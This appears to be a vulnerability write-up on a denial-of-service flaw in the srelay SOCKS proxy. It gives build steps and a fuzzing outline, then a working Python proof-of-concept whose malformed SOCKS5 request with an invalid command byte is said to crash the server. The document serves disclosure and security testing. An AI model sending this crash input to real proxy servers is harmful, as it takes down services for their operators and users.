## srelay Denial of Service Exploitation

### Objective
The goal is to analyze srelay for vulnerabilities that could lead to a Denial of Service (DoS). This effort aims to improve srelay's security by identifying and addressing potential weaknesses.

### Downloading and Compiling srelay
**Download**: Obtain the srelay source code from the official repository.
Use this link to download srelay: https://sourceforge.net/projects/socks-relay/files/socks-relay/srelay-0.4.8/srelay-0.4.8p3.tar.gz/download

**Compilation**: Use the following commands to compile the source code on a Linux environment:

```bash

sudo apt-get install build-essential # Install dependencies

tar -xvzf srelay-0.4.8p3.tar.gz # Unpack the source code archive
cd srelay-0.4.8p3
./configure
make
file srelay        
srelay: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dc63d8f21cbcc4f8fcc299142d8e01534734083a, for GNU/Linux 3.2.0, not stripped
```
**Execution**: To verify successful compilation and operation, run srelay with:
```bash
./srelay -f 
```
Ensure it is listening for connections to confirm operational status.

### Fuzzing with boofuzz
Developed a boofuzz script to target the SOCKS protocol handling in srelay. The script performs the following actions:

Steps to install boofuzz
https://boofuzz.readthedocs.io/en/stable/user/install.html

**Setup**: Initializes a boofuzz session and defines the target IP and port.

**Fuzzing Logic:** Sends a variety of malformed inputs to probe for vulnerabilities.

**Monitoring**: Leverages boofuzz's monitoring capabilities to detect crashes.

### Proof of Concept (PoC) for Denial of Service

```bash
#!/usr/bin/env python3

import socket
import struct
# SOCKS5 handshake bytes
handshake = b"\x05\x01\x00"
# SOCKS5 request bytes to connect to 127.0.0.1:80
request = b"\x05\x0c\x00\x01" + socket.inet_aton("127.0.0.1") + struct.pack(">H", 80)
# Function to send data and print the transmitted bytes
def send_data(sock, data):
    print(f"Sending {len(data)} bytes...")
    sock.sendall(data)
    print(f"Transmitted {len(data)} bytes: {data}")
# Function to receive data and print the received bytes
def receive_data(sock):
    response = sock.recv(4096)
    print(f"Received: {response}")
    return response
def main():
    # Connect to the target SOCKS proxy
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        proxy_address = ('127.0.0.1', 1080)
        print(f"Opening target connection ({proxy_address[0]}:{proxy_address[1]})...")
        sock.connect(proxy_address)
        print("Connection opened.")
        # Perform the SOCKS5 handshake
        print("Transmit Prep Node 'SOCKS5-Handshake'")
        send_data(sock, handshake)
        print("Info: Receiving...")
        receive_data(sock)
        # Send the SOCKS5 request
        print("Fuzzing Node 'SOCKS5-Request'")
        send_data(sock, request)
        # After sending, you might want to receive the response
        # from the SOCKS5 server for the request, or handle any
        # additional protocol steps depending on your needs.
        print("Closing target connection...")
        # The socket is closed automatically when the with-block ends
if __name__ == "__main__":
    main()
```

![img.png](img.png)

The PoC script demonstrates the vulnerability by sending the identified malicious input causing the crash.
